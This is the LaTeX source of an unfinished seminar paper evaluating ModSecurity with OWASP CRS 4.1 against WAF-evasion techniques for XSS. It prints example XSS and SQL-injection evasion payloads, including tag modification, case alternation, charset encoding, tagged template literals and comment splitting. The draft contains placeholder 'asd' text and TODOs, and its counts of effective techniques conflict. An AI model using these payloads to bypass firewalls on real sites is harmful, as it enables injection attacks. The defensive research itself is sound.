% Autor der Vorlage: Dominik Auracher
\documentclass[11pt, bibliography=numbered, headsepline, numbers=withenddot]{scrartcl}

% Paket für Abkürzungsverzeichnis
\usepackage[acronym, automake=delayed, nopostdot]{glossaries}
% Neue Abkürzung definieren (Sortierung egal)
% Aufbau: \newacronym{label-for-the-text}{short-version}{long-version}
\newacronym{waf}{WAF}{Web Application Firewall}
\newacronym{crs}{CRS}{CoreRuleSet}
\newacronym{faq}{FAQ}{Frequently asked questions}
\newacronym{xss}{XSS}{Cross-Site Scripting}
\newacronym{http}{HTTP}{Hypertext Transfer Protocol}
\newacronym{https}{HTTPS}{Hypertext Transfer Protocol Secure}
\newacronym{html}{HTML}{Hypertext Markup Language}
\newacronym{cwe}{CWE}{Common Weakness Enumeration}
\newacronym{nist}{NIST}{National Institute of Standards and Technology}
\newacronym{ip}{IP}{Internet Protocol}
\newacronym{tcp}{TCP}{Transmission Control Protocol}
\newacronym{uri}{URI}{Uniform Resource Identifier}

\makeglossaries

% Allgemeine Informationen
\renewcommand{\author}{\color{red}Vorname Nachname} % Autor
\newcommand{\jury}{\color{red}Prüfungskomitee} % Prüfungskomitee
\newcommand{\location}{\color{red}München} % Ort, an welchem die Arbeit geschrieben wurde
\newcommand{\matriculationnumber}{\color{red}123456} % Matrikelnummer
\newcommand{\submissiondate}{\color{red}\today} % Datum der Abgabe
\newcommand{\supervisor}{\color{red}Betreuer} % Betreuung
\renewcommand{\title}{\color{red}Titel der Arbeit} % Titel der Arbeit

% Macro für Anführungsstriche
% Verwendung: \quotes{Text} -> Resultat: "Text"
\newcommand{\quotes}[1]{``#1''}

% WICHTIG:
% Bei erstmaliger Einrichtung TeXstudio -> TeXstudio konfigurieren -> Optionen -> Erzeugen -> "Standard Bibliographieprogramm" = "Biber" setzen!
\usepackage[a4paper, left=2.5cm, top=3cm, right=3cm, bottom=2.75cm]{geometry}

% Paket zur eigenen Darstellung der Kopf-/Fußzeilen
\usepackage[automark]{scrlayer-scrpage}
\clearscrheadfoot
\setlength{\headheight}{1.27cm}
\setlength{\footheight}{1.27cm}

% Paket zur Ermittlung der letzten Seite
\usepackage{lastpage}

% Paket für Deutschsprachige Inhalte
\usepackage[english]{babel}
% \usepackage{ifxetex,ifluatex}
%
% \newif\ifunicode
% \ifxetex\unicodetrue\fi
% \ifluatex\unicodetrue\fi
%
% \ifunicode
%   \usepackage[verbose]{newunicodechar}
%   \newcommand{\DeclareUnicodeCharacter}[2]{%
%     \begingroup\lccode`|=\string"#1\relax
%     \lowercase{\endgroup\newunicodechar{|}}{#2}%
%   }
% \else
%   \usepackage[utf8]{inputenc}
% \fi
% \usepackage[T1]{fontenc}
\usepackage[babel, german=quotes]{csquotes}

% Paket für Quellcode-Anzeige (auch Inline!)
\usepackage{listings}

% Paket für Auflistungen
\usepackage[inline]{enumitem}

% Paket für Grafiken
\usepackage{graphicx}

% Paket für Farbgebungen
\usepackage{xcolor}

% Quellenverwaltung
\usepackage[backend=biber, style=alphabetic, isbn=false, hyperref=true]{biblatex}
% \usepackage[backend=biber, style=ieee, isbn=false, hyperref=true]{biblatex}
\addbibresource{literature.bib}
%\DeclareFieldFormat*{title}{#1}            % Format for bibliography
\DeclareFieldFormat*{citetitle}{#1}        % Format for citations

% Paket, welches das Jahr zusätzlich in die Fußnote aufnehmen kann
\usepackage{xpatch}
\xapptobibmacro{cite}{\setunit{\nametitledelim}\printfield{year}}{}{}

% Paket und Konfiguration für Zahlen
\usepackage[locale=DE]{siunitx}
\sisetup{per-mode=fraction}

% Paket und Konfiguration für Schriftart
% Zur Verwendung von Arial, TeXstudio konfigurieren: Optionen -> TeXstudio konfigurieren -> Optionen -> Erzeugen -> "Standardcompiler" = "XeLaTeX" setzen!
% \usepackage{fontspec}
% \setmainfont{Arial}
% \setsansfont{Arial}
% \usepackage{unicode-math}
% \setmathfont{notosansmath}
% \setmainfont{droidsans}
% \usepackage{sourcecodepro}


% Wichtig: Als letztes Paket laden!
\usepackage{hyperref}
\hypersetup{
	colorlinks=false,
	allbordercolors=white
}

% Neu-Definition der Namen
\renewcommand{\sectionautorefname}{Abschnitt}
\renewcommand{\subsectionautorefname}{Abschnitt}
\renewcommand{\subsubsectionautorefname}{Abschnitt}
\renewcommand{\figureautorefname}{Abb.}
\renewcommand{\tableautorefname}{Tab.}
\renewcommand{\listoflofentryname}{Abb.}

% Zeilenabstand einstellen
\renewcommand{\baselinestretch}{1.25}

\begin{document}
	%config
	% code listing config
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
\lstdefinestyle{ruleStyle}{
	backgroundcolor=\color{backcolour},
	commentstyle=\color{codegreen},
	keywordstyle=\color{magenta},
	numberstyle=\tiny\color{codegray},
	stringstyle=\color{codepurple},
	identifierstyle=\color{blue},
	rulecolor=\color{black},
	basicstyle=\ttfamily,
	breakatwhitespace=false,
	breaklines=true,
	captionpos=b,
	keepspaces=true,
	numbers=left,
	showspaces=false,
	showstringspaces=false,
	showtabs=false,
	tabsize=2,
	frame=single,
	morekeywords={test, do, <file>},
	aboveskip=1\baselineskip,
	escapeinside=\^\^
}

\lstdefinestyle{basicStyle}{
	backgroundcolor=\color{backcolour},
	commentstyle=\color{codegreen},
	numberstyle=\tiny\color{codegray},
	stringstyle=\color{codepurple},
	rulecolor=\color{black},
	basicstyle=\ttfamily,
	breakatwhitespace=false,
	breaklines=true,
	captionpos=b,
	keepspaces=true,
	numbers=left,
	showspaces=false,
	showstringspaces=false,
	showtabs=false,
	tabsize=2,
	frame=single,
	aboveskip=1\baselineskip,
	escapeinside=\^\^
}


	% Deckblatt
	\begin{titlepage}
	\centering
	\includegraphics[width=0.8\textwidth]{"General/HDBW_Logo_large.png"}
	\vfill
	{\LARGE\bfseries Seminararbeit\par}
	\vspace{1cm}
	{\Large\bfseries \title\par}
	\vfill
	{\Large vorgelegt von:\par}
	{\Large\bfseries \author\par}
	{\Large (Matrikelnummer: \matriculationnumber)\par}
	\vfill
	\begin{tabular}{ll}
		vorgelegt am: & \submissiondate\\
	\end{tabular}
	\par
	\begin{tabular}{ll}
		Prüfer: & \jury\\
		Betreuung: & \supervisor\\
	\end{tabular}
\end{titlepage}

	\newpage

	% Kopf-/Fußzeilen ab 2. Seite
	\renewcommand*\sectionmarkformat{}% keine Nummerierung im Kopf
	\renewcommand*{\headfont}{\normalfont} % Nicht kursiv	
	\rohead*{\includegraphics{"General/HDBW_Logo_small.png"}}
	\lofoot*{\scriptsize \submissiondate}
	\rofoot*{\scriptsize Seite \thepage\ von \pageref{LastPage}}
	
	% Eidesstattliche Erklärung
	\lohead*{Eidesstattliche Erklärung}

\section*{Eidesstattliche Erklärung}
\label{sec:Eidesstattliche Erklärung}
Hiermit versichere ich, dass die vorliegende Arbeit ohne Hilfe Dritter und nur mit den angegebenen Quellen und Hilfsmitteln angefertigt wurde. Alle verwendeten Passagen wurden kenntlich gemacht. Diese Arbeit hat in gleicher oder ähnlicher Form noch keiner Prüfungsbehörde vorgelegen.
\newline
\newline
\newline
\newline
\author
\newline
\location, \submissiondate

	\newpage
	
	% Zusammenfassung
	\color{black}
	
	% Kopf-/Fußzeilen ab 4. Seite
	\lohead*{\headmark}
	
	% Inhaltsverzeichnis
	\tableofcontents
	\newpage
	
	% Abkürzungsverzeichnis
	\printglossary[type=\acronymtype,title={Acronyms},style=tree,nonumberlist]
	
	% Abbildungsverzeichnis
	\listoffigures
	
	% Tabellenverzeichnis
	\listoftables
	
	% Quellcode-Verzeichnis
	\lstlistoflistings
	\newpage
	
	% --- INHALT ---
	\section{Abstract}
Web application firewalls are employed in a defense-in-depth strategy to protect web applications.
Institutions deciding to employ a web application firewall likely ask the question how well the web application can protect a web application against targeted malicious requests.
After deciding to employ a web application firewall, knowing the answer to this question is vital to correctly assess the predicted standing of the protected web application against the threat landscape.
In order to evaluate a web application firewall against targeted malicious requests, a gray box evaluation system is proposed. The main idea is to simulate malicious requests against the web application using firewall evasion techniques, like a real attacker would, and simultaneously use the firewall log to increase the efficiency in finding bypassing payloads.
Found bypasses are subsequently used to propose ruleset additions in order to reduce the total amount of efficient firewall evasion techniques against the evaluated firewall configuration.
Experiments are conducted using the proposed system to evaluate the open-source OWASP ModSecurity firewall configured to use the OWASP \acrfull{crs} version 4.1 against targeted malicious \acrfull{xss} payloads.
The results reveal that 11 of 18 researched evasion techniques to obfuscate \acrshort{xss} payloads can be used in some combination to create multiple bypassing malicious payloads.
As response to found bypasses, proposals for ruleset additions to the \acrshort{crs} 4.1 could be given based on the developed system.

	\newpage

	\section{Executive Summary}
asd
The evasion techniques were used to try and create bypassing payloads that would evade the filtering of the evaluated firewall configuration. 
First, unobscured payloads were sent in HTTP requests towards the Web application firewall.
At this point, the firewall logs were inspected
Then, payloads were created using a single iteration of applying a single evasion technique to determine which evasion techniques are most effective. At this point, some created payloads already bypassed the evaluted firewall configuration.
Afterwards, evasion techniques determined to be effective were used in combination across multiple iterations to eventually create bypassing payloads.
In total, multiple bypassing payloads could be created. Those were sent in HTTP requests towards the evaluated firewall configuration, bypassed it and reached a testing Web application that should have been proted by the firewall configuration.

It was discovered that 13 of 18 evasion techniques are effective, some only in combination with other evasion techniques. 
When a created payloads was sent in a request towards the evaluated firewall configuration and blocked by the very same, the firewall log was inspected to determine why a payload caused the request to get blocked by the firewall. 

In order to answer the question
\begin{quote}
	How well can web application firewalls in their generic standard configuration
	protect a web application against targeted malicious requests?
\end{quote}
fundamentals regarding the context around web application firewalls were described.
The focus here was on web application firewall evasion, which is the action of obscuring malicious payloads in such a way that they bypass web application firewalls.
If an attacker wants to actively target a web application that is protected by a firewall, it stands to reason that such evasion techniques would come to use. 

Therefore, firewall evasion techniques used to obscure payloads were researched.
As Cross-Site Scripting is a notable weakness linked to injection vulnerabilities, the focus was on evasion techniques used to obscure Cross-Site Scripting payloads.
6 different techniques to obscure various payloads were researched, 12 different techniques to specifically obscure Cross-site payloads were researched. 

Subsequently, researched evasion techniques were used to evaluate the performance of the OWASP ModSecurity firewall configured to use the OWASP CoreRuleSet in version 4.1 against targeted payloads. 
The evasion techniques were used to try and create bypassing payloads that would evade the filtering of the evaluated firewall configuration. 

In order to achieve this, an evaluation methodology was proposed. 
The evaluation methodology follows a gray box approach that pays close attention to the firewall log during the evaluation.
When a created payloads was sent in a request towards the evaluated firewall configuration and blocked by the very same, the firewall log was inspected to determine why a payload caused the request to get blocked by the firewall. 
Through analyzing the log messages, it was possible to trace which rules caused the request to get blocked and which parts of a payloads caused those rules to trigger. 
They led to insight about which evasion techniques were effective in creating bypassing payloads against the evaluated firewall configuration.
Using this knowledge, bypassing payloads to evaluate the firewall configuration could be developed efficiently.
In total, it was discovered that 11 of 18 evasion techniques are effective in creating targeted bypassing payloads, some only in combination with other evasion techniques. 

In closing, the insight into the filtering performance of the evaluted firewall configuration was used to propose additional firewall rules. Those prevent some of the found bypassing payloads. In addition to that, ideas for further ruleset improvements were stated.


	\newpage
	\section{Introduction}
The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.
% \cite{OWASP/Top10}
In the two most recent editions, OWASP Top 10 2017 Edition and OWASP Top 10 2021 Edition, the top 1 security risk is a risk that developers seek to mitigate by employing a web application firewall. \cite{OWASP/Top10,OWASP/Risks2017,OWASP/Risks2021}

Injection vulnerabilities, OWASP top 1 risk of 2017, and Broken Access Control vulnerabilities, OWASP top 1 risk of 2021, can both be exploited using malicious \acrfull{http} requests. \cite{OWASP/Injection,OWASP/BrokenAccessControl}

In a perfect scenario, a web application firewall would filter, detect and block those malicious requests while at the same time allowing standard application traffic to reach the web application. 
For some web application firewalls, the filtering behaviour can be configured with a set of rules that define which requests are going to be blocked by the firewall. \cite{OWASP/CRS,wargio/naxsiRules,Cisco/SnortRulesDocs}


When employing a web application firewall, it is mandatory to set up the rules in a way where a maximum of potentially malicious requests gets blocked while allowing all intended application traffic. This set up requires a balancing act of indentifying and defining standard request patterns as well as malicious request patterns. Both identification tasks are non trivial. Some web application firewalls come with a standard set of rules that aim to protect a web application from a wide range of attacks while allowing for a minimal rate of false positives. \cite{OWASP/CRS,wargio/naxsiRules,Cisco/SnortRulesDownload}

Antagonist actors aimed at exploiting vulnerabilities of such a protected web application need to try and make their malicious \acrshort{http} requests bypass the web application firewall. To bypass a web application firewall, firewall evasion techniques are being used. \cite{HackTricks/WAFBypass} With firewall evasion techniques in mind, the question arises: 
\begin{quote} "How well can web application firewalls in their generic standard configuration protect a web application against targeted malicious requests?" 
\end{quote}
This question will be discussed in more detail first.


	\newpage
	\subsection{Goals of this work}
asd


	\subsection{Related work}
In order to evaluate the performance of web application firewalls, Demetrio et al. \cite{rw/demetrio} propose WAF-A-MoLE, a tool following a guided mutational fuzz testing approach to bypass machine learning based web application firewalls. WAF-A-MoLE repeatedly transforms a failing test SQL-injection payload through random application of predefined mutational operators. Execution results of those payloads are ordered according to performance metrics. Subsequently, the process is repeated for the payloads with better execution results until a bypassing payload is found. The performance metrics are based on the confidence value generated by the web application firewall during the filtering of a payload. The confidence value represents the web application firewalls confidence in its classification of a payload as malicious. Once a certain confidence value threshold is undershot, the payload bypasses the firewall. It has been shown that WAF-A-MoLE successfully manages to degrade the confidence value of a machine learning based web application firewall to bypass a semantically equal SQL-injection payloads to \verb|admin ' OR 1=1#|.

Mohammadhossein et al. \cite{rw/mohammad} propose Reinforcement-Learning-Driven and Adaptive Testing (RAT), an automated black-box testing strategy to discover injection vulnerabilities in web application firewalls. They focus on SQL Injection and Cross-site scripting payloads. In order to improve efficiency in black-box testing, RAT clusters similar attack samples together. It then utilizes a reinforcement learning technique combined with a novel adaptive search algorithm to discover almost all bypassing attack patterns efficiently. RAT is compared with three state-of-the-art methods. RAT is supposed to performs significantly better than its counterparts in discovering the most possible bypassing payloads and reducing the number of attempts before finding the first bypassing payload when testing against well-configured WAFs.

Ke Li et al. \cite{rw/derLI} propose DaNuoYi, an automatic injection testing tool that simultaneously generates test inputs for multiple types of injection attacks on a Web application firewall. It's hypothesis is that test inputs from syntactically different types of injection attacks share certain latent semantic similarities that can be useful to generate sophisticated test inputs for each other. DaNuoYi assumes a context-free grammar (CFG) for each type of injection attack. This CFG is used to create test inputs to profile a Web application firewall. DaNuoYi trains a classifier to predict the likelihood of a test input bypassing the WAF. A multi-task injection translation paradigm to bridge the test input generation across different types of injection attack is developed. For any pair of injection types, a translation model is built that translates the test input from one type of injection
attack into a semantically related one. These models are trained using the data also generated by the CFG. Test inputs for multiple types of injection attacks are generated simultaneously by a multi-task evolutionary algorithm (MTEA). This MTEA shares promising test inputs generated for one type of injection attack across other types of injection attack by using the multi-task translation models.
At each generation, domain-specific mutation operators similar to evasion techniques are used to generate offspring inputs, which are then also tested against the Web application firewall.
It is shown that when employing DaNuoYi, both the multi-task translation and multi-task search are effective in handling and transferring the common semantic information for different injection types. This resulted in more bypassing test results that evaluated, single-task counterparts.


	\subsection{Overview and Scope}
Related work described in the previous section focuses on improving the efficiency of fuzzy testing by proposing sophisticated systems to iteratively create bypassing payloads. Yet all those systems work in a black-box setting. Payloads are created without the knowledge about the reason why a payload was rejected by the tested web application firewall.

In a real work scenario, when institutions decide to evaluate the performance of an employed web application firewall, it is likely that there is more information available during the evaluation than used in a black-box scenario. 
Therefore, this work proposes using this information during the evaluation of a web application firewall to form a gray-box evaluation scenario. 
The overarching idea is to keep the perspective of an attacker that targets a web application protected by a web application firewall, while improving the efficiency in finding bypassing payloads by using the information provided by the firewall log. 

Attackers targeting web applications protected by web application firewalls are using firewall evasion techniques to create bypassing payloads. 
Found bypassing payloads directly correlate to weaknesses in the rule configuration of the evaluated web application firewall.
Therefore, to answer the question
\begin{quote}
How well can web application firewalls in their generic standard configuration
protect a web application against targeted malicious requests?
\end{quote}
the author considers using firewall evasion techniques to be essential.

In summary, to answer the afromentioned question, this work proposes to use firewall evasion techniques in a gray box scenario to efficiently evaluate web application firewalls. \\
% Firewall Evasion techniques will be detailed in the further course of this work. 

While malicious request containing payloads without obfuscation are certainly of importance, this work will focus on targeted attacks using payloads that were obscured using firewall evasion techniques.
% In Section~\ref{sec:fundamentals}, fundamentals regarding Web Applications, Web Application Security, Web Application Firewalls and Web Application Firewall Evasion will be detailed.
Targeted attacks come in many different forms, one being Cross-Site Scripting payloads.
With JavaScript being the most used programming language as of 2023 and Cross-Site Scripting being a notable weakness linked to Injection vulnerabilities, this work focuses on Cross-Site Scripting payloads. \cite{statista/mostusedlang,OWASP/Injection21}

Initially, in the following Section~\ref{sec:fundamentals}, this work details fundamentals regarding web applications and web application security. This is followed by an introduction to web application firewalls and web application firewall evasion.

In Section~\ref{sec:firewallevasiontechniques}, firewall evasion techniques applicable to Cross-Site Scripting payloads are laid out.

In Section~\ref{sec:evaluation}, the evaluation methodology is described. An iterative approach to try and create bypassing payloads using the evasion techniques laid out under Section~\ref{sec:firewallevasiontechniques}. In an experiment, the evaluation methodology is used to to make payloads evade the open-source ModSecurity firewall configured to use the OWASP CoreRuleSet version 4.1.

Section~\ref{sec:EvaluationResults} describes the evaluation results. Effective evasion techniques and found bypasses are stated. Based on those, this work discusses occuring payload limitations in the context of tested firewall configurations, properties of the web application to be protected and used firewall evasion techniques in Section~\ref{sec:payloadlimitations}. Section~\ref{sec:rulesproposal} details proposed rule additions derived from the evaluation results.

Subsequently, a generic evaluation proposal is presented and assessed in Section~\ref{sec:proposal}.

Finally, this work is concluded in Section~\ref{sec:conclusion} and ideas for further research are proposed in Section~\ref{sec:continuations}.

In this work, no LLM-based or other machine learning approaches are pursued. Nonetheless, these approaches are promising and will be mentioned in Section~\ref{sec:continuations}.


	\newpage
	\section{Theoretical fundamentals}
To understand the context around firewall evasion, fundamentals regarding ... {\color{red} TODO}

	\subsection{Web Application}
With recent developments leading to increased availability and usage of the Internet, the way businesses and institutions are run has been influcenced.
This has led to the widespread adoption of web applications by companies. \cite{stackpath/webapp}
Businesses hope to streamline their processes and increase efficiency by employing web applications. 

In the scope of Software, a web application is software that runs in a web browser.
They allow to access complex functionality without installing or configuring software.
Web application provide a means for businesses and other institutions or individuals to share information and deliver services remotely and securely.
Website features like shopping carts, product search and instant messaging are web applications by design. \cite{aws/webapp}

Amazon, providing multiple web applications themselves, describes the typical architecture of a web application as follows:
\begin{quote}
	Web applications have a client-server architecture.
	Their code is divided into two components—client-side scripts and server-side scripts.


	\textbf{Client-side architecture}


	The client-side script deals with user interface functionality like buttons and drop-down boxes.
	When the end user clicks on the web app link, the web browser loads the client-side script and renders the graphic elements and text for user interaction.
	For example, the user can read content, watch videos, or fill out details on a contact form.
	Actions like clicking the submit button go to the server as a client request.


	\textbf{Server-side architecture}


	The server-side script deals with data processing.
	The web application server processes the client requests and sends back a response.
	The requests are usually for more data or to edit or save new data.
	For example, if the user clicks on the Read More button, the web application server will send content back to the user.
	If the user clicks the Submit button, the application server will save the user data in the database.
	In some cases, the server completes the data request and sends the complete HTML page back to the client.
	This is called server side rendering. \cite{aws/webapp}
\end{quote}
The foundation of any data exchange on the Web is the HTTP protocol.
It is a client-server protocol on the application layer in which clients and servers communicate by exchanging individual messages.
The messages sent by the client are called requests, the messages sent by the server are called responses. Responses are sent as an answer to requests.

The actor on the client-side is the user-agent.
A user-agent is any tool that acts on behalf of the user, such as web browsers used by users visiting web pages.
User-agents are always the entity that initiates a request.
To dispay a web page, a web browser sends a request to fetch the data that represents the page.
Additional requests are made during the display or the interaction with a web page.
These are triggered corresponding to execution scripts.

Responses are sent by the server, which is the actor on the server-side.
A server serves the data of a web page as requested by the client.

Unless there is a direct physical connection between the server and the client, numerous machines from the Web stack are used in between to relay the HTTP messages.
Most of these operate at the transport, network or physical layer.
Those operating at the application layer are generally called proxies.
Proxies exist in message altering or transparent form, in which case they forward the message without alteration. \cite{mdn/http}

Web application firewalls can be filtering proxies that filter out HTTP messages indentified as malicious.



	\subsection{Web Application Security and Common Vulnerabilities}
The term \quotes{Web Application Security} refers to ... 
Common vulnerabilities in web applications include ... \cite{OWASP/Top10}
Different kinds of XSS ...
{\color{red}TODO}

	\subsection{Web Application Firewall}
A web application firewall is a firewall acting on the application layer ... {\color{red} TODO}

	\subsection{Web Application Firewall Evasion}
Web application firewall evasion refers to the action of trying to make malicious payloads evade the detection by the WAF.

In the context of Web application firewalls, HTTP requests are modified in such a way that their payload is both, maliciously influencing the Web application as well as evading the detection by the Web application firewall. To achieve both attributes in a payload, the payload must be obscured and kept valid simultaneously. When encountering a Web application firewall that filters the traffic based on signature detection, firewall evading payloads are created by modifying the payload syntax while keeping payload semantics. Considering signature detection based on regex matching, the character sequence of \verb|alert(| matches on some regex based filtering rules. \verb|alert(| is part of the JavaScript built-in function \verb|alert()|. On calling it inside a browser, a visible dialog is displayed by the browser. The dialogs content depend on the given argument to the function. \cite{js/alert}
Suppose the payload \verb|alert(1)| is to be used as a proof of concept payload testing for \gls{xss} vulnerabilities.
To evade a regex based rule that looks for the character sequence \verb|alert(|, the character sequence needs to be substituded with another sequence that does not trigger a match. An example is the sequence \verb|alert`| as part of the payload \verb|alert`1`| which uses a different syntax in the form of Tagged Template Literals to achieve the same effect: displaying a dialog with the content "1" inside the browser.
In this case, the semantics of the payload stayed while the syntax was changed to evade detection by the Web application firewall.
Further techniques to create firewall evading payloads are described in Section~\ref{sec:firewallevasiontechniques}.

With increased obscurity, the difficulty of creating a valid payload increases. Building on the afromentioned example around \verb|alert()|, some payload limitations occur with the usage of Tagged Template Literals. When switching the target from displaying a dialog with the content "1" to displaying a dialog with content based on an expression, these limitations become apparent. Considering the expression \verb|1+1|, the target could be achieved by supplying the payload \verb|alert(1+1)| - without a Web application firewall rejecting messages containing the character sequence \verb|alert(|. Calling the function this way, with the expression as an argument, the expression will be evaluated and the browser displays a dialog with the content based on the expression result: "2".
If Tagged Template Literals are used to evade the firewall in the same bracket-replacing fashion as before: \verb|alert`1+1`, the result will be semantically different to the intended target.
Because of how Tagged Template Literals are designed in the JavaScript programming language, the call to \verb|alert`1+1`| will display a dialog with the content "1+1". The expression will not be evaluated, the target has not been achieved. Therefore the payload is not valid. It is neccessary to invite more obscurity into the payload. 
Placeholders in the form of \verb|${expression}| can be used inside Tagged Template Literals. The payload can be modified to \verb|alert`${1+1}`|. Executing this payload will result in the display of a dialog with the content ",". When calling a function using Tagged Template Literals in JavaScript, the first argument given to the function will be an array of strings corresponding to the strings surrounding the \verb|${expression}| placeholders. In the call \verb|alert`${1+1}`|, this array is of the form \verb|["",""]. When calling the function \verb|alert| with an argument other than a string, it will be converted to a string before being displayed. The array \verb|["",""]| converted to string results in the string \verb|","|. 
As the function \verb|alert| accepts a single argument, it can not be used together with Tagged Template Literals to display a dialog with content based on the evaluation of an expression.
When calling a function using Tagged Template Literals that contain \verb|${expression}| placeholders, the evaluation results of the expressions in the placeholders will be given to the calling function as the second and following arguments.
The specified example target states that the result of the expression \verb|1+1| should be displayed in a dialog.
To achieve this, the function \verb|alert| can be substituded with the function \verb|prompt|. Executed inside a browser, the \verb|prompt| function displays a dialog consisting of a message to the user, similar to \verb|alert| and an input field for user input. It takes in two arguments, the first being a string with the content of the message to the user, the second one a string with the default value in the input field. 
Calling \verb|prompt| with a Tagged Template Literal in the form of \verb|prompt`${1+1}`| in the browser displays a dialog with content consisting of the message "," and an input field prefilled with "2" - the result of the expression \verb|1+1|.  
The syntax of the payload \verb|alert(1+1)| had to be changed to \verb|prompt`${1+1}`|. The semantics from the perspective of the JavaScript programming language changed as well. From the perspective of the specified target: displaying a dialog with the result of the expression \verb|1+1|, both payloads, \verb|alert(1+1)| and \verb|promp`${1+1}` might be seen as semantically equivalent. Especially in a case where the result of an expression might reveal a secret instead of a simple mathematical operation. It is obvious that possible attackers do not care if their targeted secret is displayed inside a static textbox or an input field. \cite{js/taggedtemplates,js/alert,js/prompt}

Incurring payload limitations found are further discussed in Section~\ref{sec:payloadlimitations}.
l



	\newpage
	\section{Firewall evasion techniques}
\label{sec:firewallevasiontechniques}

{\color{red} Compatibility with browsers is so far not being regarded. TODO: check JavaScript versions (ECMA script 6) and write about browser compatibility}
Naturally, when discussing web application firewall evasion, most chosen firewall evasion techniques are covering XSS Payloads.

All techniques are available {\color{red} TODO: (at the time of writing)}





	\subsection{Various Payloads}
\label{sec:varioustech}

\subsubsection{Payload size}


\subsubsection{Unicode encoding in JSON}
RFC 4627 \quotes{The application/json Media Type for JavaScript Object Notation} states under section 2.5 \quotes{Strings}:
\begin{quote}
	The representation of strings is similar to conventions used in the C
	family of programming languages.  A string begins and ends with
	quotation marks.  All Unicode characters may be placed within the
	quotation marks except for the characters that must be escaped:
	quotation mark, reverse solidus, and the control characters (U+0000
	through U+001F).

	Any character may be escaped.  If the character is in the Basic
	Multilingual Plane (U+0000 through U+FFFF), then it may be
	represented as a six-character sequence: a reverse solidus, followed
	by the lowercase letter u, followed by four hexadecimal digits that
	encode the character's code point.  The hexadecimal letters A though
	F can be upper or lowercase.  So, for example, a string containing
	only a single reverse solidus character may be represented as
	"\u005C". \cite{rfc4627}
\end{quote}
As escaping any character should be possible in a JSON payload, firewall filters that look for a certain sequence of characters might be evaded by escaping one or more characters from that sequence.


\subsubsection{Unicode normalization}
{\color{red}
\cite{unicode/normalization}
\cite{medium/allypetitt}
}


\subsubsection{Case alternation}
In order to evade regex filerting by the WAF, the case of a payload can be alternated. \cite{medium/allypetitt}
Modern regex flavors allow the application of modifiers to parts of the regular expression.
One such modifier is \verb|(?i)|. It makes the regex case insensitive. \cite{regex/jan} Only when this modifier is not used, can a payload evade regex filtering using case alternation.

Taking the XSS payload \verb|<script>alert('XSS')</script>| as an example, after applying case alternation, it might result in a payload in the form of: \verb|<sCrIpT>alert('XSS')</sCriPt>|.
Another example is file access on a wrongfully public file.
The Windows file system trests file and directory names as case-insensitive by default. \cite{windows/casesensitive}
On a web server hosted on Windows that exposes a .env file with stored secrets, both urls: \\ \verb|http://127.0.0.1:8000/.env| and \verb|http://127.0.0.1:8000/.enV| \\
are treated equally. {\color{red}TODO: verified by the author using the python webserver module on windows 10 [should this be here?]}


\subsubsection{Comment interference}
In some context, comments can be used to break up statements. Regarding SQL, the Oracle Database SQL Reference states:
\begin{quote}
	A comment can appear between any keywords, parameters, or punctuation marks in a statement. You can include a comment in a statement in two ways:
	\begin{itemize}
		\item Begin the comment with a slash and an asterisk (/*). Proceed with the text of the comment. This text can span multiple lines. End the comment with an asterisk and a slash (*/). The opening and terminating characters need not be separated from the text by a space or a line break.
		\item Begin the comment with -- (two hyphens). Proceed with the text of the comment. This text cannot extend to a new line. End the comment with a line break.
	\end{itemize}
	\cite{oracle/sqlcomments}
\end{quote}
Ally Petitt suggests using comments inside SQL statements to break up SQL keywords: \verb|?id=1+un/**/ion+sel/**/ect+1,2,3--| \cite{medium/allypetitt}


\subsubsection{Percent encoding}


\subsubsection{Charset alternation}
To indicate the original media type prior to any applied content encoding, the HTTP \verb|Content-Type| representation header is used.
It can be used in requests by the client to tell the server what type of data is actually sent.
\verb|charset| is a possible directive, that specifies the character encoding standard.
It can be supplied with the \verb|Content-Type| header. \cite{http/contenttype}
If a web server is supporting requests in different encoding standards, but the WAF is not configured to parse certain encoding standards, the WAF may not recognize such encoded request as malicious.

The payload \verb|'<script>alert("xss")</script>'| becomes \\
\verb|'L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n'|
after encoding the payload to the charset \verb|IBM037| followed by percent encoding. \\
This differs from the same payload in \verb|UTF-8| followed by percent encoding: \\
\verb|'%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E'| \\
\verb|UTF-8| encoding is the standard for URIs according to RFC-3986. \cite{rfc3986} \\
Technique by \cite{medium/allypetitt}.

	\subsection{XSS Payloads}
\label{sec:xsstech}
This section lists evasion techniques applicable to \gls{xss} payloads.

\subsubsection{Tag modification}
In a case, where regex filters are configured to look for html tags, modifying html tags might make a payload evade the filter. Possible modifications include:
\begin{itemize}
	\item prepending the tag with an additional \verb|<|: \verb|<<script>alert('XSS')</script>|
	\item omitting the closing tag: \verb|<script>alert('XSS')|
	\item using double open angle brackets: \verb|<iframe src=javascript:alert('XSS') <|
	\item using uncommon tags: \\ \verb|<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE>|
\end{itemize}
Technique by \cite{medium/allypetitt}

\subsubsection{Space replace}
A regex filter that is expecting a space inside a html tag at certain positions can be evaded by replacing the space with a \verb|/|.
For instance, \verb|<img src="1" onerror="alert('XSS')">| becomes \verb|<img/src="1"/onerror="alert('XSS')">|.
Technique by \cite{medium/allypetitt}

\subsubsection{HTML encoding}
{\color{red}TODO: see the <a> thing}

\subsubsection{From charcode}
{\color{red}TODO: String.fromCharCode(0x4c,105,0x6e,117,120) \cite{asecsite/jsobf1}}

\subsubsection{String passing}
\subsubsection{JavaScript escaping}
\label{sec:jsescape}
{\color{red} TODO:
	\begin{itemize}
		\item js hex escape
		\item js octal escape
		\item js normal character escape
		\item js unicode escape es6
	\end{itemize}
}

\subsubsection{Tagged Template Literals}
\label{sec:taggedtemplateliterals}
Tagged Template Literals can be used in JavaScript payloads to avoid detection of JavaScript function calls in an http request. Dr. Alex Rauschmeyer explains Tagged Template Literals in ``Exploring ES6'':
\begin{quotation} Tagged Template Literals are function calls whose parameters are provided via template literals. [...]
	The following is a tagged template literal (short: tagged template):
	\begin{lstlisting}
tagFunction`Hello ${firstName} ${lastName}!`
\end{lstlisting}
